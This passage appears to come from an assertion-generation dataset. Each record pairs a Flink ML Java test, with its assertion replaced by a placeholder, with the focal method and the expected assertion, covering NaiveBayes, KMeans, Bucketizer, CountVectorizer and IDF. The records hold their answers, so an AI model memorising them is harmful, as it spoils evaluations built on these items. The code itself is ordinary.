DataStreamUtils.mapPartition( featureWeight.keyBy(value -> value.f0), new AggregateIntoArrayFunction(), Types.TUPLE( Types.DOUBLE, Types.INT, Types.OBJECT_ARRAY(Types.MAP(Types.DOUBLE, Types.DOUBLE))));  DataStream<NaiveBayesModelData> modelData = DataStreamUtils.mapPartition( aggregatedArrays, new GenerateModelFunction(smoothing), NaiveBayesModelData.TYPE_INFO); modelData.getTransformation().setParallelism(1);  Schema schema = Schema.newBuilder() .column( ""theta"", DataTypes.ARRAY( DataTypes.ARRAY( DataTypes.MAP( DataTypes.DOUBLE(), DataTypes.DOUBLE())))) .column(""piArray"", DataTypes.of(DenseVectorTypeInfo.INSTANCE)) .column(""labels"", DataTypes.of(DenseVectorTypeInfo.INSTANCE)) .build();  NaiveBayesModel model = new NaiveBayesModel().setModelData(tEnv.fromDataStream(modelData, schema)); ParamUtils.updateExistingParams(model, paramMap); return model; }"	assertEquals(expectedOutput, actualOutput)
"Exception { estimator = TestUtils.saveAndReload( tEnv, estimator, tempFolder.newFolder().getAbsolutePath(), NaiveBayes::load);  NaiveBayesModel model = estimator.fit(trainTable);  model = TestUtils.saveAndReload( tEnv, model, tempFolder.newFolder().getAbsolutePath(), NaiveBayesModel::load);  Table outputTable = model.transform(predictTable)[0];  Map<Vector, Double> actualOutput = executeAndCollect(outputTable, model.getFeaturesCol(), model.getPredictionCol()); ""<AssertPlaceHolder>""; }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1);  final String featuresCol = getFeaturesCol(); final String labelCol = getLabelCol(); final double smoothing = getSmoothing();  StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); DataStream<Tuple2<Vector, Double>> input = tEnv.toDataStream(inputs[0]) .map( (MapFunction<Row, Tuple2<Vector, Double>>) row -> { Number number = (Number) row.getField(labelCol); Preconditions.checkNotNull( number, ""Input data should contain label value.""); Preconditions.checkArgument( number.intValue() == number.doubleValue(), ""Label value should be indexed number.""); return new Tuple2<>( (Vector) row.getField(featuresCol), number.doubleValue()); }, Types.TUPLE(VectorTypeInfo.INSTANCE, Types.DOUBLE));  DataStream<Tuple3<Double, Integer, Double>> feature = input.flatMap(new ExtractFeatureFunction());  DataStream<Tuple4<Double, Integer, Map<Double, Double>, Integer>> featureWeight = DataStreamUtils.mapPartition( feature.keyBy(value -> new Tuple2<>(value.f0, value.f1).hashCode()), new GenerateFeatureWeightMapFunction(), Types.TUPLE( Types.DOUBLE, Types.INT, Types.MAP(Types.DOUBLE, Types.DOUBLE), Types.INT));  DataStream<Tuple3<Double, Integer, Map<Double, Double>[]>> aggregatedArrays = DataStreamUtils.mapPartition( featureWeight.keyBy(value -> value.f0), new AggregateIntoArrayFunction(), Types.TUPLE( Types.DOUBLE, Types.INT, Types.OBJECT_ARRAY(Types.MAP(Types.DOUBLE, Types.DOUBLE))));  DataStream<NaiveBayesModelData> modelData = DataStreamUtils.mapPartition( aggregatedArrays, new GenerateModelFunction(smoothing), NaiveBayesModelData.TYPE_INFO); modelData.getTransformation().setParallelism(1);  Schema schema = Schema.newBuilder() .column( ""theta"", DataTypes.ARRAY( DataTypes.ARRAY( DataTypes.MAP( DataTypes.DOUBLE(), DataTypes.DOUBLE())))) .column(""piArray"", DataTypes.of(DenseVectorTypeInfo.INSTANCE)) .column(""labels"", DataTypes.of(DenseVectorTypeInfo.INSTANCE)) .build();  NaiveBayesModel model = new NaiveBayesModel().setModelData(tEnv.fromDataStream(modelData, schema)); ParamUtils.updateExistingParams(model, paramMap); return model; }"	assertEquals(expectedOutput, actualOutput)
"testSetModelData() { NaiveBayesModel modelA = estimator.fit(trainTable);  Table modelData = modelA.getModelData()[0]; NaiveBayesModel modelB = new NaiveBayesModel().setModelData(modelData); ParamUtils.updateExistingParams(modelB, modelA.getParamMap());  Table outputTable = modelB.transform(predictTable)[0];  Map<Vector, Double> actualOutput = executeAndCollect(outputTable, modelB.getFeaturesCol(), modelB.getPredictionCol()); ""<AssertPlaceHolder>""; }
getParamMap() { return paramMap; }"	assertEquals(expectedOutput, actualOutput)
"Exception { AgglomerativeClustering agglomerativeClustering = new AgglomerativeClustering() .setNumClusters(null) .setDistanceThreshold(Double.MAX_VALUE); Table output = agglomerativeClustering.transform(inputDataTable)[0]; HashSet<Integer> clusterIds = new HashSet<>(); tEnv.toDataStream(output) .executeAndCollect() .forEachRemaining( x -> clusterIds.add( x.getFieldAs(agglomerativeClustering.getPredictionCol()))); ""<AssertPlaceHolder>""; }
transform(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); Integer numCluster = getNumClusters(); Double distanceThreshold = getDistanceThreshold(); Preconditions.checkArgument( (numCluster == null && distanceThreshold != null) || (numCluster != null && distanceThreshold == null), ""One of param numCluster and distanceThreshold should be null."");  if (getLinkage().equals(LINKAGE_WARD)) { String distanceMeasure = getDistanceMeasure(); Preconditions.checkArgument( distanceMeasure.equals(EuclideanDistanceMeasure.NAME), distanceMeasure + "" was provided as distance measure while linkage was ward. Ward only works with euclidean.""); }  StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); DataStream<Row> dataStream = tEnv.toDataStream(inputs[0]);  RowTypeInfo inputTypeInfo = TableUtils.getRowTypeInfo(inputs[0].getResolvedSchema()); RowTypeInfo outputTypeInfo = new RowTypeInfo( ArrayUtils.addAll(inputTypeInfo.getFieldTypes(), Types.INT), ArrayUtils.addAll(inputTypeInfo.getFieldNames(), getPredictionCol()));  OutputTag<Tuple4<Integer, Integer, Double, Integer>> mergeInfoOutputTag = new OutputTag<Tuple4<Integer, Integer, Double, Integer>>(""MERGE_INFO"") {};  SingleOutputStreamOperator<Row> output = DataStreamUtils.windowAllAndProcess( dataStream, getWindows(), new LocalAgglomerativeClusteringFunction<>( getFeaturesCol(), getLinkage(), getDistanceMeasure(), getNumClusters(), getDistanceThreshold(), getComputeFullTree(), mergeInfoOutputTag, outputTypeInfo));  Schema schema = Schema.newBuilder() .fromResolvedSchema(inputs[0].getResolvedSchema()) .column(getPredictionCol(), DataTypes.INT()) .build();  Table outputTable = tEnv.fromDataStream(output, schema);  DataStream<Tuple4<Integer, Integer, Double, Integer>> mergeInfo = output.getSideOutput(mergeInfoOutputTag); mergeInfo.getTransformation().setParallelism(1); Table mergeInfoTable = tEnv.fromDataStream(mergeInfo) .as(""clusterId1"", ""clusterId2"", ""distance"", ""sizeOfMergedCluster"");  return new Table[] {outputTable, mergeInfoTable}; }"	assertEquals(1, clusterIds.size())
"testOutputSchema() { Table input = dataTable.as(""test_feature""); KMeans kmeans = new KMeans().setFeaturesCol(""test_feature"").setPredictionCol(""test_prediction""); KMeansModel model = kmeans.fit(input); Table output = model.transform(input)[0];  ""<AssertPlaceHolder>""; }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1);  StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); DataStream<DenseVector> points = tEnv.toDataStream(inputs[0]) .map(row -> ((Vector) row.getField(getFeaturesCol())).toDense());  DataStream<DenseVector[]> initCentroids = selectRandomCentroids(points, getK(), getSeed());  IterationConfig config = IterationConfig.newBuilder() .setOperatorLifeCycle(IterationConfig.OperatorLifeCycle.ALL_ROUND) .build();  IterationBody body = new KMeansIterationBody( getMaxIter(), DistanceMeasure.getInstance(getDistanceMeasure()));  DataStream<KMeansModelData> finalModelData = Iterations.iterateBoundedStreamsUntilTermination( DataStreamList.of(initCentroids), ReplayableDataStreamList.notReplay(points), config, body) .get(0);  Table finalModelDataTable = tEnv.fromDataStream(finalModelData); KMeansModel model = new KMeansModel().setModelData(finalModelDataTable); ParamUtils.updateExistingParams(model, paramMap); return model; }"	"assertEquals( Arrays.asList(""test_feature"", ""test_prediction""), output.getResolvedSchema().getColumnNames())"
"testFewerDistinctPointsThanCluster() { List<DenseVector> data = Arrays.asList( Vectors.dense(0.0, 0.1), Vectors.dense(0.0, 0.1), Vectors.dense(0.0, 0.1));  Table input = tEnv.fromDataStream(env.fromCollection(data)).as(""features"");  KMeans kmeans = new KMeans().setK(2); KMeansModel model = kmeans.fit(input); Table output = model.transform(input)[0];  List<Set<DenseVector>> expectedGroups = Collections.singletonList(Collections.singleton(Vectors.dense(0.0, 0.1))); List<Row> results = IteratorUtils.toList(output.execute().collect()); List<Set<DenseVector>> actualGroups = groupFeaturesByPrediction( results, kmeans.getFeaturesCol(), kmeans.getPredictionCol()); ""<AssertPlaceHolder>""; }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1);  StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); DataStream<DenseVector> points = tEnv.toDataStream(inputs[0]) .map(row -> ((Vector) row.getField(getFeaturesCol())).toDense());  DataStream<DenseVector[]> initCentroids = selectRandomCentroids(points, getK(), getSeed());  IterationConfig config = IterationConfig.newBuilder() .setOperatorLifeCycle(IterationConfig.OperatorLifeCycle.ALL_ROUND) .build();  IterationBody body = new KMeansIterationBody( getMaxIter(), DistanceMeasure.getInstance(getDistanceMeasure()));  DataStream<KMeansModelData> finalModelData = Iterations.iterateBoundedStreamsUntilTermination( DataStreamList.of(initCentroids), ReplayableDataStreamList.notReplay(points), config, body) .get(0);  Table finalModelDataTable = tEnv.fromDataStream(finalModelData); KMeansModel model = new KMeansModel().setModelData(finalModelDataTable); ParamUtils.updateExistingParams(model, paramMap); return model; }"	assertTrue(CollectionUtils.isEqualCollection(expectedGroups, actualGroups))
"testSetModelData() { KMeans kmeans = new KMeans().setMaxIter(2).setK(2); KMeansModel modelA = kmeans.fit(dataTable); KMeansModel modelB = new KMeansModel().setModelData(modelA.getModelData()); ParamUtils.updateExistingParams(modelB, modelA.getParamMap());  Table output = modelB.transform(dataTable)[0]; List<Row> results = IteratorUtils.toList(output.execute().collect()); List<Set<DenseVector>> actualGroups = groupFeaturesByPrediction( results, kmeans.getFeaturesCol(), kmeans.getPredictionCol()); ""<AssertPlaceHolder>""; }
getParamMap() { return paramMap; }"	assertTrue(CollectionUtils.isEqualCollection(expectedGroups, actualGroups))
"computeLoss() { double loss = BinaryLogisticLoss.INSTANCE.computeLoss(dataPoint, coefficient); ""<AssertPlaceHolder>""; }
computeLoss(LabeledPointWithWeight dataPoint, DenseVector coefficient) { double dot = BLAS.dot(dataPoint.getFeatures(), coefficient); double labelScaled = 2 * dataPoint.getLabel() - 1; return dataPoint.getWeight() * Math.log(1 + Math.exp(-dot * labelScaled)); }"	assertEquals(0.0049513, loss, TOLERANCE)
"computeLoss() { double loss = LeastSquareLoss.INSTANCE.computeLoss(dataPoint, coefficient); ""<AssertPlaceHolder>""; }
computeLoss(LabeledPointWithWeight dataPoint, DenseVector coefficient) { double dot = BLAS.dot(dataPoint.getFeatures(), coefficient); return dataPoint.getWeight() * 0.5 * Math.pow(dot - dataPoint.getLabel(), 2); }"	assertEquals(25.0, loss, TOLERANCE)
"testCompressMultiTimes() { QuantileSummary summary = buildSummary(datasets.get(0), 0.001); QuantileSummary newSummary = summary.compress(); ""<AssertPlaceHolder>""; }
compress() { if (compressed) { return this; } QuantileSummary inserted = insertHeadBuffer(); Preconditions.checkState(inserted.headBuffer.isEmpty()); Preconditions.checkState(inserted.count == count + headBuffer.size());  List<StatsTuple> compressed = compressInternal(inserted.sampled, 2 * relativeError * inserted.count); return new QuantileSummary( relativeError, compressThreshold, compressed, inserted.count, true); }"	assertEquals(summary, newSummary)
"testOutputSchema() { Binarizer binarizer = new Binarizer() .setInputCols(""f0"", ""f1"", ""f2"") .setOutputCols(""of0"", ""of1"", ""of2"") .setThresholds(0.0, 0.0, 0.0);  Table output = binarizer.transform(inputDataTable)[0];  ""<AssertPlaceHolder>""; }
transform(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment();  RowTypeInfo inputTypeInfo = TableUtils.getRowTypeInfo(inputs[0].getResolvedSchema()); String[] inputCols = getInputCols(); Preconditions.checkArgument(inputCols.length == getThresholds().length); TypeInformation<?>[] outputTypes = new TypeInformation[inputCols.length];  for (int i = 0; i < inputCols.length; ++i) { int idx = inputTypeInfo.getFieldIndex(inputCols[i]); Class<?> typeClass = inputTypeInfo.getTypeAt(idx).getTypeClass(); if (typeClass.equals(SparseVector.class)) { outputTypes[i] = SparseVectorTypeInfo.INSTANCE; } else if (typeClass.equals(DenseVector.class)) { outputTypes[i] = DenseVectorTypeInfo.INSTANCE; } else if (typeClass.equals(Vector.class)) { outputTypes[i] = VectorTypeInfo.INSTANCE; } else { outputTypes[i] = Types.DOUBLE; } }  RowTypeInfo outputTypeInfo = new RowTypeInfo( ArrayUtils.addAll(inputTypeInfo.getFieldTypes(), outputTypes), ArrayUtils.addAll(inputTypeInfo.getFieldNames(), getOutputCols()));  DataStream<Row> output = tEnv.toDataStream(inputs[0]) .map(new BinarizeFunction(inputCols, getThresholds()), outputTypeInfo); Table outputTable = tEnv.fromDataStream(output);  return new Table[] {outputTable}; }"	"assertEquals( Arrays.asList(""f0"", ""f1"", ""f2"", ""of0"", ""of1"", ""of2""), output.getResolvedSchema().getColumnNames())"
"testOutputSchema() { Bucketizer bucketizer = new Bucketizer() .setInputCols(""f1"", ""f2"", ""f3"", ""f4"") .setOutputCols(""o1"", ""o2"", ""o3"", ""o4"") .setHandleInvalid(HasHandleInvalid.SKIP_INVALID) .setSplitsArray(splitsArray); Table output = bucketizer.transform(inputTable)[0]; ""<AssertPlaceHolder>""; }
transform(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); String[] inputCols = getInputCols(); String[] outputCols = getOutputCols(); Double[][] splitsArray = getSplitsArray(); Preconditions.checkArgument(inputCols.length == outputCols.length); Preconditions.checkArgument(inputCols.length == splitsArray.length);  StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment();  RowTypeInfo inputTypeInfo = TableUtils.getRowTypeInfo(inputs[0].getResolvedSchema()); TypeInformation<?>[] outputTypes = new TypeInformation[outputCols.length]; Arrays.fill(outputTypes, BasicTypeInfo.DOUBLE_TYPE_INFO); RowTypeInfo outputTypeInfo = new RowTypeInfo( ArrayUtils.addAll(inputTypeInfo.getFieldTypes(), outputTypes), ArrayUtils.addAll(inputTypeInfo.getFieldNames(), getOutputCols()));  int[] inputColumnIndexes = TableUtils.getColumnIndexes(inputs[0].getResolvedSchema(), inputCols); DataStream<Row> result = tEnv.toDataStream(inputs[0]) .flatMap( new FindBucketFunction( inputColumnIndexes, splitsArray, getHandleInvalid()), outputTypeInfo); return new Table[] {tEnv.fromDataStream(result)}; }"	"assertEquals( Arrays.asList(""id"", ""f1"", ""f2"", ""f3"", ""f4"", ""o1"", ""o2"", ""o3"", ""o4""), output.getResolvedSchema().getColumnNames())"
"Exception { Bucketizer bucketizer = new Bucketizer() .setInputCols(""f1"", ""f2"", ""f3"", ""f4"") .setOutputCols(""o1"", ""o2"", ""o3"", ""o4"") .setSplitsArray(splitsArray);  Table output;  // Tests skip. bucketizer.setHandleInvalid(HasHandleInvalid.SKIP_INVALID); output = bucketizer.transform(inputTable)[0]; verifyOutputResult(output, bucketizer.getOutputCols(), expectedSkipResult);  // Tests keep. bucketizer.setHandleInvalid(HasHandleInvalid.KEEP_INVALID); output = bucketizer.transform(inputTable)[0]; verifyOutputResult(output, bucketizer.getOutputCols(), expectedKeepResult);  // Tests error. bucketizer.setHandleInvalid(HasHandleInvalid.ERROR_INVALID); output = bucketizer.transform(inputTable)[0]; try { IteratorUtils.toList(output.execute().collect()); fail(); } catch (Throwable e) { ""<AssertPlaceHolder>""; } }
transform(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); String[] inputCols = getInputCols(); String[] outputCols = getOutputCols(); Double[][] splitsArray = getSplitsArray(); Preconditions.checkArgument(inputCols.length == outputCols.length); Preconditions.checkArgument(inputCols.length == splitsArray.length);  StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment();  RowTypeInfo inputTypeInfo = TableUtils.getRowTypeInfo(inputs[0].getResolvedSchema()); TypeInformation<?>[] outputTypes = new TypeInformation[outputCols.length]; Arrays.fill(outputTypes, BasicTypeInfo.DOUBLE_TYPE_INFO); RowTypeInfo outputTypeInfo = new RowTypeInfo( ArrayUtils.addAll(inputTypeInfo.getFieldTypes(), outputTypes), ArrayUtils.addAll(inputTypeInfo.getFieldNames(), getOutputCols()));  int[] inputColumnIndexes = TableUtils.getColumnIndexes(inputs[0].getResolvedSchema(), inputCols); DataStream<Row> result = tEnv.toDataStream(inputs[0]) .flatMap( new FindBucketFunction( inputColumnIndexes, splitsArray, getHandleInvalid()), outputTypeInfo); return new Table[] {tEnv.fromDataStream(result)}; }"	"assertEquals( ""The input contains invalid value. See "" + HasHandleInvalid.HANDLE_INVALID + "" parameter for more options."", ExceptionUtils.getRootCause(e).getMessage())"
"testOutputSchema() { CountVectorizer countVectorizer = new CountVectorizer().setInputCol(""test_input"").setOutputCol(""test_output""); CountVectorizerModel model = countVectorizer.fit(inputTable); Table output = model.transform(inputTable.as(""test_input""))[0]; ""<AssertPlaceHolder>""; }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); double minDF = getMinDF(); double maxDF = getMaxDF(); if (minDF >= 1.0 && maxDF >= 1.0 || minDF < 1.0 && maxDF < 1.0) { Preconditions.checkArgument(maxDF >= minDF, ""maxDF must be >= minDF.""); }  String inputCol = getInputCol(); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); DataStream<String[]> inputData = tEnv.toDataStream(inputs[0]) .map( (MapFunction<Row, String[]>) value -> ((String[]) value.getField(inputCol)));  DataStream<CountVectorizerModelData> modelData = DataStreamUtils.aggregate( inputData, new VocabularyAggregator(getMinDF(), getMaxDF(), getVocabularySize()), Types.TUPLE( Types.LONG, Types.MAP(Types.STRING, Types.TUPLE(Types.LONG, Types.LONG))), TypeInformation.of(CountVectorizerModelData.class));  CountVectorizerModel model = new CountVectorizerModel().setModelData(tEnv.fromDataStream(modelData)); ParamUtils.updateExistingParams(model, getParamMap()); return model; }"	"assertEquals( Arrays.asList(""test_input"", ""test_output""), output.getResolvedSchema().getColumnNames())"
"Exception { CountVectorizer countVectorizer = new CountVectorizer(); CountVectorizer loadedCountVectorizer = TestUtils.saveAndReload( tEnv, countVectorizer, tempFolder.newFolder().getAbsolutePath(), CountVectorizer::load); CountVectorizerModel model = loadedCountVectorizer.fit(inputTable); CountVectorizerModel loadedModel = TestUtils.saveAndReload( tEnv, model, tempFolder.newFolder().getAbsolutePath(), CountVectorizerModel::load); ""<AssertPlaceHolder>""; Table output = loadedModel.transform(inputTable)[0]; verifyPredictionResult(output, countVectorizer.getOutputCol(), EXPECTED_OUTPUT); }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); double minDF = getMinDF(); double maxDF = getMaxDF(); if (minDF >= 1.0 && maxDF >= 1.0 || minDF < 1.0 && maxDF < 1.0) { Preconditions.checkArgument(maxDF >= minDF, ""maxDF must be >= minDF.""); }  String inputCol = getInputCol(); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); DataStream<String[]> inputData = tEnv.toDataStream(inputs[0]) .map( (MapFunction<Row, String[]>) value -> ((String[]) value.getField(inputCol)));  DataStream<CountVectorizerModelData> modelData = DataStreamUtils.aggregate( inputData, new VocabularyAggregator(getMinDF(), getMaxDF(), getVocabularySize()), Types.TUPLE( Types.LONG, Types.MAP(Types.STRING, Types.TUPLE(Types.LONG, Types.LONG))), TypeInformation.of(CountVectorizerModelData.class));  CountVectorizerModel model = new CountVectorizerModel().setModelData(tEnv.fromDataStream(modelData)); ParamUtils.updateExistingParams(model, getParamMap()); return model; }"	"assertEquals( Arrays.asList(""vocabulary""), loadedModel.getModelData()[0].getResolvedSchema().getColumnNames())"
"testFitOnEmptyData() { Table emptyTable = tEnv.fromDataStream(env.fromCollection(INPUT_DATA).filter(x -> x.getArity() == 0)) .as(""input""); CountVectorizer countVectorizer = new CountVectorizer(); CountVectorizerModel model = countVectorizer.fit(emptyTable); Table modelDataTable = model.getModelData()[0]; try { modelDataTable.execute().print(); fail(); } catch (Throwable e) { ""<AssertPlaceHolder>""; } }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); double minDF = getMinDF(); double maxDF = getMaxDF(); if (minDF >= 1.0 && maxDF >= 1.0 || minDF < 1.0 && maxDF < 1.0) { Preconditions.checkArgument(maxDF >= minDF, ""maxDF must be >= minDF.""); }  String inputCol = getInputCol(); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); DataStream<String[]> inputData = tEnv.toDataStream(inputs[0]) .map( (MapFunction<Row, String[]>) value -> ((String[]) value.getField(inputCol)));  DataStream<CountVectorizerModelData> modelData = DataStreamUtils.aggregate( inputData, new VocabularyAggregator(getMinDF(), getMaxDF(), getVocabularySize()), Types.TUPLE( Types.LONG, Types.MAP(Types.STRING, Types.TUPLE(Types.LONG, Types.LONG))), TypeInformation.of(CountVectorizerModelData.class));  CountVectorizerModel model = new CountVectorizerModel().setModelData(tEnv.fromDataStream(modelData)); ParamUtils.updateExistingParams(model, getParamMap()); return model; }"	"assertEquals(""The training set is empty."", ExceptionUtils.getRootCause(e).getMessage())"
"testOutputSchema() { Table inputTable = tEnv.fromDataStream(env.fromElements(Row.of(Vectors.dense(0.0), """"))) .as(""test_input"", ""dummy_input"");  DCT dct = new DCT().setInputCol(""test_input"").setOutputCol(""test_output"");  Table outputTable = dct.transform(inputTable)[0];  ""<AssertPlaceHolder>""; }
transform(Table... inputs) { Preconditions.checkArgument(inputs.length == 1);  StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment();  RowTypeInfo inputTypeInfo = TableUtils.getRowTypeInfo(inputs[0].getResolvedSchema()); RowTypeInfo outputTypeInfo = new RowTypeInfo( ArrayUtils.addAll( inputTypeInfo.getFieldTypes(), DenseVectorTypeInfo.INSTANCE), ArrayUtils.addAll(inputTypeInfo.getFieldNames(), getOutputCol()));  DataStream<Row> stream = tEnv.toDataStream(inputs[0]) .map(new DCTFunction(getInputCol(), getInverse()), outputTypeInfo);  return new Table[] {tEnv.fromDataStream(stream)}; }"	"assertEquals( Arrays.asList(dct.getInputCol(), ""dummy_input"", dct.getOutputCol()), outputTable.getResolvedSchema().getColumnNames())"
"testOutputSchema() { ElementwiseProduct elementwiseProduct = new ElementwiseProduct() .setInputCol(""vec"") .setOutputCol(""outputVec"") .setScalingVec(Vectors.dense(1.0, 2.0, 3.0)); Table output = elementwiseProduct.transform(inputDataTable)[0]; ""<AssertPlaceHolder>""; }
transform(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); RowTypeInfo inputTypeInfo = TableUtils.getRowTypeInfo(inputs[0].getResolvedSchema()); RowTypeInfo outputTypeInfo = new RowTypeInfo( ArrayUtils.addAll(inputTypeInfo.getFieldTypes(), VectorTypeInfo.INSTANCE), ArrayUtils.addAll(inputTypeInfo.getFieldNames(), getOutputCol())); DataStream<Row> output = tEnv.toDataStream(inputs[0]) .map( new ElementwiseProductFunction(getInputCol(), getScalingVec()), outputTypeInfo); Table outputTable = tEnv.fromDataStream(output); return new Table[] {outputTable}; }"	"assertEquals( Arrays.asList(""id"", ""vec"", ""sparseVec"", ""outputVec""), output.getResolvedSchema().getColumnNames())"
"testVectorSizeNotEquals() { try { ElementwiseProduct elementwiseProduct = new ElementwiseProduct() .setInputCol(""vec"") .setOutputCol(""outputVec"") .setScalingVec(Vectors.dense(1.1, 1.1, 2.0)); Table output = elementwiseProduct.transform(inputDataTable)[0]; DataStream<Row> dataStream = tEnv.toDataStream(output); IteratorUtils.toList(dataStream.executeAndCollect()); fail(); } catch (Exception e) { ""<AssertPlaceHolder>""; } }
transform(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); RowTypeInfo inputTypeInfo = TableUtils.getRowTypeInfo(inputs[0].getResolvedSchema()); RowTypeInfo outputTypeInfo = new RowTypeInfo( ArrayUtils.addAll(inputTypeInfo.getFieldTypes(), VectorTypeInfo.INSTANCE), ArrayUtils.addAll(inputTypeInfo.getFieldNames(), getOutputCol())); DataStream<Row> output = tEnv.toDataStream(inputs[0]) .map( new ElementwiseProductFunction(getInputCol(), getScalingVec()), outputTypeInfo); Table outputTable = tEnv.fromDataStream(output); return new Table[] {outputTable}; }"	"assertEquals( ""The scaling vector size is 3, which is not equal input vector size(2)."", ExceptionUtils.getRootCause(e).getMessage())"
"testOutputSchema() { HashingTF hashingTF = new HashingTF(); inputDataTable = tEnv.fromDataStream(env.fromElements(Row.of(Arrays.asList(""""), Arrays.asList("""")))) .as(""input"", ""dummyInput"");  Table output = hashingTF.transform(inputDataTable)[0]; ""<AssertPlaceHolder>""; }
transform(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment();  ResolvedSchema tableSchema = inputs[0].getResolvedSchema();  RowTypeInfo inputTypeInfo = TableUtils.getRowTypeInfo(tableSchema); RowTypeInfo outputTypeInfo = new RowTypeInfo( ArrayUtils.addAll( inputTypeInfo.getFieldTypes(), SparseVectorTypeInfo.INSTANCE), ArrayUtils.addAll(inputTypeInfo.getFieldNames(), getOutputCol()));  DataStream<Row> output = tEnv.toDataStream(inputs[0]) .map( new HashTFFunction(getInputCol(), getBinary(), getNumFeatures()), outputTypeInfo); return new Table[] {tEnv.fromDataStream(output)}; }"	"assertEquals( Arrays.asList(hashingTF.getInputCol(), ""dummyInput"", hashingTF.getOutputCol()), output.getResolvedSchema().getColumnNames())"
"testOutputSchema() { Table tempTable = tEnv.fromDataStream(env.fromElements(Row.of("""", """"))) .as(""test_input"", ""dummy_input""); IDF idf = new IDF().setInputCol(""test_input"").setOutputCol(""test_output""); Table output = idf.fit(tempTable).transform(tempTable)[0];  ""<AssertPlaceHolder>""; }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); final String inputCol = getInputCol(); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment();  DataStream<Vector> inputData = tEnv.toDataStream(inputs[0]) .map( (MapFunction<Row, Vector>) value -> ((Vector) value.getField(inputCol)), VectorTypeInfo.INSTANCE);  DataStream<IDFModelData> modelData = DataStreamUtils.aggregate(inputData, new IDFAggregator(getMinDocFreq()));  IDFModel model = new IDFModel().setModelData(tEnv.fromDataStream(modelData)); ParamUtils.updateExistingParams(model, getParamMap()); return model; }"	"assertEquals( Arrays.asList(""test_input"", ""dummy_input"", ""test_output""), output.getResolvedSchema().getColumnNames())"
"Exception { IDF idf = new IDF(); idf = TestUtils.saveAndReload( tEnv, idf, tempFolder.newFolder().getAbsolutePath(), IDF::load);  IDFModel model = idf.fit(inputTable); model = TestUtils.saveAndReload( tEnv, model, tempFolder.newFolder().getAbsolutePath(), IDFModel::load);  ""<AssertPlaceHolder>"";  Table output = model.transform(inputTable)[0]; verifyPredictionResult(expectedOutput, output, idf.getOutputCol()); }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); final String inputCol = getInputCol(); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment();  DataStream<Vector> inputData = tEnv.toDataStream(inputs[0]) .map( (MapFunction<Row, Vector>) value -> ((Vector) value.getField(inputCol)), VectorTypeInfo.INSTANCE);  DataStream<IDFModelData> modelData = DataStreamUtils.aggregate(inputData, new IDFAggregator(getMinDocFreq()));  IDFModel model = new IDFModel().setModelData(tEnv.fromDataStream(modelData)); ParamUtils.updateExistingParams(model, getParamMap()); return model; }"	"assertEquals( Arrays.asList(""idf"", ""docFreq"", ""numDocs""), model.getModelData()[0].getResolvedSchema().getColumnNames())"
"testFitOnEmptyData() { Table emptyTable = tEnv.fromDataStream(env.fromElements(Row.of(1, 2)).filter(x -> x.getArity() == 0)) .as(""input""); IDFModel model = new IDF().fit(emptyTable); Table modelDataTable = model.getModelData()[0];  try { modelDataTable.execute().collect().next(); fail(); } catch (Throwable e) { ""<AssertPlaceHolder>""; } }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); final String inputCol = getInputCol(); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment();  DataStream<Vector> inputData = tEnv.toDataStream(inputs[0]) .map( (MapFunction<Row, Vector>) value -> ((Vector) value.getField(inputCol)), VectorTypeInfo.INSTANCE);  DataStream<IDFModelData> modelData = DataStreamUtils.aggregate(inputData, new IDFAggregator(getMinDocFreq()));  IDFModel model = new IDFModel().setModelData(tEnv.fromDataStream(modelData)); ParamUtils.updateExistingParams(model, getParamMap()); return model; }"	"assertEquals(""The training set is empty."", ExceptionUtils.getRootCause(e).getMessage())"
"testOutputSchema() { Imputer imputer = new Imputer() .setInputCols(""f1"", ""f2"", ""f3"", ""f4"") .setOutputCols(""o1"", ""o2"", ""o3"", ""o4""); ImputerModel model = imputer.fit(trainDataTable); Table output = model.transform(predictDataTable)[0]; ""<AssertPlaceHolder>""; }
